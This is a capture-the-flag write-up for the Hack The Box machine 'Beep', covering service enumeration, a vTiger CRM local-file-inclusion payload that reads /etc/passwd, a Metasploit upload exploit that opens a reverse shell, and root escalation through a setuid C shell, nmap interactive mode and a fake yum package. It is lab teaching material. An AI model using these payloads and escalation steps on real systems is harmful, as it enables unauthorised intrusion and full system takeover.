---
layout: single
title: Beep - Hack The Box
excerpt: This is the writeup for Beep, an easy machine with multiple ways to get an initial shell and multiple ways to priv esc as well 
date: 2021-01-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-beep/beep-logo.png
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - lfi
  - sudo-misuse
---

![](/assets/images/htb-writeup-beep/beep_logo.png)


<h1> Beep </h1>
<h4> difficulty: 3.8 / easy </h4>

This box was rather fun, as it followed the strategy of having so many services and so many web applications to make you so confused on to what to look for, the key 
here was to do everything as quick and asynchronously as possible, because doing one thing at a time would be so slow, I really wanna thank the box creator for his effort
on this box. Without further to do, let's dig into the write up

<h3> Init foohold </h3>

First let's start with an initial nmap scan, and then a full one to cover all ports

```bash
# Nmap 7.80 scan initiated Thu Jan 21 01:24:43 2021 as: nmap -sV -v -sC -Pn -oN nmap/init 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.096s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING APOP AUTH-RESP-CODE EXPIRE(NEVER) RESP-CODES STLS LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) TOP UIDL USER
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: X-NETSCAPE Completed OK IMAP4 STARTTLS URLAUTHA0001 SORT=MODSEQ NO CHILDREN LITERAL+ THREAD=REFERENCES IMAP4rev1 RENAME MULTIAPPEND ACL UIDPLUS ANNOTATEMORE UNSELECT CATENATE BINARY ATOMIC CONDSTORE LIST-SUBSCRIBED RIGHTS=kxte ID MAILBOX-REFERRALS SORT QUOTA IDLE LISTEXT THREAD=ORDEREDSUBJECT NAMESPACE
443/tcp   open  ssl/https?
|_ssl-date: 2021-01-21T08:31:34+00:00; +1h03m22s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```
Given that there are a lot of things to try I'll also run gobuster in the background on https/443, and since the **SSL Version** is 1.0 we have to change ```/etc/ssl/openssl``` to accept TLSv1.0 which can be done by 
```bash
sudo sed -i's/TLSv1\.2/TLSv1\.0/g' /etc/ssl/openssl.cnf```
```
Gobuster command:

```bash
gobuster dir -w /home/tyr4n7/Documents/SecLists-master//Discovery/Web-Content/raft-large-directories.txt -t 50 --url https://10.10.10.7/ -o enum/https_443 -k
```
I also used `searchsploit to check for any vulns on elastix, cyrus services and webmin -- however it was a process of elimantion and most of them yielded false positives. I kept looking around but sadly nothing got me anywhere so I thought it might be the time to check my gobuster results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7/
[+] Threads:        30
[+] Wordlist:       /home/tyr4n7/Documents/SecLists-master//Discovery/Web-Content/raft-large-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/21 09:23:58 Starting gobuster
===============================================================
/modules (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/help (Status: 301)
/images (Status: 301)
/mail (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/libs (Status: 301)
/var (Status: 301)
/panel (Status: 301)
/vtigercrm (status 301)
/recordings (status 301)
```
Upon inspecting recordings, it turns out to be `FreePBX 2.5` which doesn't have any CVEs with that version, however vtigercrm has a bigger potential

```bash
searchsploit VTiger Crm
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
vTiger CRM 4.2 - 'calpath' Multiple Remote File Inclusions                         | php/webapps/2508.txt
vTiger CRM 4.2 - SQL Injection                                                     | php/webapps/26586.txt
vTiger CRM 4.2 Leads Module - 'record' Cross-Site Scripting                        | php/webapps/26584.txt
vTiger CRM 4.2 RSS Aggregation Module - Feed Cross-Site Scripting                  | php/webapps/26585.txt
vTiger CRM 5.0.4 - Local File Inclusion                                            | php/webapps/16280.py
vTiger CRM 5.0.4 - Multiple Cross-Site Scripting Vulnerabilities                   | php/webapps/32307.txt
vTiger CRM 5.0.4 - Remote Code Execution / Cross-Site Request Forgery / Local File | php/webapps/9450.txt
vTiger CRM 5.1.0 - Local File Inclusion                                            | php/webapps/18770.txt
vTiger CRM 5.2 - 'onlyforuser' SQL Injection                                       | php/webapps/36208.txt
vTiger CRM 5.2.1 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities (1)   | php/webapps/36203.txt
vTiger CRM 5.2.1 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities (2)   | php/webapps/36255.txt
vTiger CRM 5.2.1 - 'PHPrint.php' Multiple Cross-Site Scripting Vulnerabilities     | php/webapps/36204.txt
vTiger CRM 5.2.1 - 'sortfieldsjson.php' Local File Inclusion                       | php/webapps/35574.txt
vTiger CRM 5.2.1 - 'vtigerservice.php' Cross-Site Scripting                        | php/webapps/35577.txt
vTiger CRM 5.3.0 5.4.0 - (Authenticated) Remote Code Execution (Metasploit)        | php/remote/29319.rb
vTiger CRM 5.4.0 - 'index.php?onlyforuser' SQL Injection                           | php/webapps/28409.txt
vTiger CRM 5.4.0 SOAP - AddEmailAttachment Arbitrary File Upload (Metasploit)      | php/remote/30787.rb
vTiger CRM 5.4.0 SOAP - Multiple Vulnerabilities                                   | php/webapps/27279.txt
vTiger CRM 5.4.0/6.0 RC/6.0.0 GA - 'browse.php' Local File Inclusion               | php/webapps/32213.txt
Vtiger CRM 6.3.0 - (Authenticated) Arbitrary File Upload (Metasploit)              | php/webapps/44379.rb
vTiger CRM 6.3.0 - (Authenticated) Remote Code Execution                           | php/webapps/38345.txt
Vtiger CRM 7.1.0 - Remote Code Execution                                           | php/webapps/46065.py
----------------------------------------------------------------------------------- ---------------------------------
```

There are two things to note here:
- the 5.2.1 local file inclusion vulnerability can be used to get the user.txt, given that we can read the ```/etc/passed``` to guess the username



```bash
-rw-rw-r-- 1 fanis fanis 33 Jan 21 18:20 /home/fanis/user.txt
```
the LFI exploitation is fairly simple:
```
curl --insecure https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php\?module_name\=../../../../../../etc/passwd%00
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash

# let's try to read fannis flag file
curl --insecure https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php\?module_name\=../../../../../../home/fanis/user.txt%00  | wc -c 
33 # 32 char flag + newline character
```


- I'll firstly look for any good looking RCE. We start by elimanting any authenticated RCE given that we don't have any credentials, then we choose the closet one to version 5.1.0 (Which can be known from `http://10.10.10.7/vtigercrm/`), we come to the conclusion that 5.4.0 AddEmailAttachment seems to be the finest pick.

```bash
msfconsole 
search AddEmailAttachment
use exploit/multi/http/vtiger_soap_upload
show options
set SSL yes
set RPORT 443 # HTTPs/SSL port
set RHOSTS 10.10.10.7 # server ip
set LHOST 10.10.14.5 # MY tun0 interface ip
run
un

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Uploading payload...
[+] Upload successfully uploaded
[*] Executing payload...
[*] Sending stage (38288 bytes) to 10.10.10.7
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.7:45546) at 2021-01-21 09:37:42 -0600


meterpreter > shell
Process 4093 created.
Channel 0 created.
id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
```
Which gets us the initial foothold as asterisk user which is a VOIP service and that's why the box is called Beep.

<h2> Priv Esc </h2>

priv esc is a tradational misuse of sudo priviledges.


```bash
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```
There're several ways to escalate to root with these permissions:

- We can use chmod + chown to creater a setuid executable that automatically elavate us to root

setuid.c

```c
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
```

```bash
wget http://10.10.14.5:8080/setuid.c
--2021-01-21 18:58:42--  http://10.10.14.5:8080/setuid.c
Connecting to 10.10.14.5:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 164 [text/plain]
Saving to: `setuid.c'

     0K                                                       100% 38.8M=0s

2021-01-21 18:58:42 (38.8 MB/s) - `setuid.c' saved [164/164]

gcc setuid.c -o setuid
ls -la setuid 
-rwxr-xr-x 1 asterisk asterisk 5144 Jan 21 18:58 setuid
sudo chown root setuid
sudo chmod 4777 setuid
./setuid
id
uid=0(root) gid=0(root) groups=101(asterisk)
```

- we can use nmap to run an interactive shell and then drop /bin/sh:

```bash
sudo nmap --interactive
!sh

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
- we can use Yum to make fake package that executes /bin/sh as root

```bash
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF

sudo yum localinstall -y x-1.0-1.noarch.rpm
```

There are several other ways to escalate to root, but I'll end my writeup here. This box was fun & easy, Thanks for reading this far :D <3

- Tyr4n7

